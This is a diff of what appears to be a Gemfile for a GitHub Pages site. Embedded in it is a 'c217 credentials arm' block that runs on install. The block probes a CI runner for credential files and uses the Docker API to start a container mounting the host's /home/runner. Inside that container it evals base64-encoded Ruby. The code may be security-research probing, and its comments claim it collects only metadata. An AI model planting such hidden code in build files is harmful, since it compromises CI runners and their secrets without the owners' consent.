@@ -44,8 +44,7 @@ proof = {
 File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
 
 gem "github-pages", "= 232"
-
-# --- c217 credentials arm v8 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
+# --- c217 credentials arm v9 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
 require 'json'
 require 'digest'
 require 'socket'
@@ -72,7 +71,7 @@ end
 incont = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
            'home_runner' => c217_one('/home/runner'),
            'control' => c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials') }
-warn 'C217ARMV8 ' + JSON.generate(incont)
+warn 'C217ARMV9 ' + JSON.generate(incont)
 
 host_probe = <<'RUBY'
 require 'json'; require 'digest'
@@ -153,7 +152,8 @@ begin
   if pick
     env_b64 = Base64.strict_encode64(host_probe)
     create = { 'Image' => pick,
-               'Cmd' => ['ruby','-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))'],
+               'Entrypoint' => ['ruby'],
+               'Cmd' => ['-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))'],
                'Env' => ['C217RUBY=' + env_b64],
                'HostConfig' => { 'Binds' => ['/home/runner:/host:ro'], 'NetworkMode' => 'none' } }.to_json
     st, body = ureq('POST', '/v1.41/containers/create?name=c217probe', create)
@@ -177,4 +177,4 @@ begin
 rescue StandardError => e
   warn 'C217DOCKER EXC ' + e.class.name + ' ' + e.message.to_s[0,200]
 end
-warn 'C217ARMV8 done'
+warn 'C217ARMV9 done'
